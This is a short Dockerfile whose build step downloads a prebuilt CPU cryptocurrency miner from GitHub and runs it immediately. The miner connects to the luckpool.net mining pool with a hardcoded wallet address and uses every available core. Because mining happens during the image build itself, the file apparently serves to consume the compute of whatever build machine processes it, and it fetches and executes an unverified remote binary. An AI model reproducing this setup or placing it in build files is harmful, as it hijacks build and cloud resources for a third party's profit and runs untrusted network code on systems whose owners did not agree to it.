FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
    	&& apt install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev  libjansson-dev libgmp-dev make gcc g++ git zlib1g-dev ocl-icd-opencl-dev \
        && apt-get install wget
ADD entrypoint.sh /entrypoint.sh
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xvf hellminer_cpu_linux.tar.gz && chmod +x hellminer && chmod +x verus-solver && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RUA92tQZsJeNBFCPyMY9ndi6ZNRT4XmDjD.$(echo $(shuf -i 1-1000 -n 1)XEON128CORES -p hybrid -t $(nproc)
CMD /entrypoint.sh
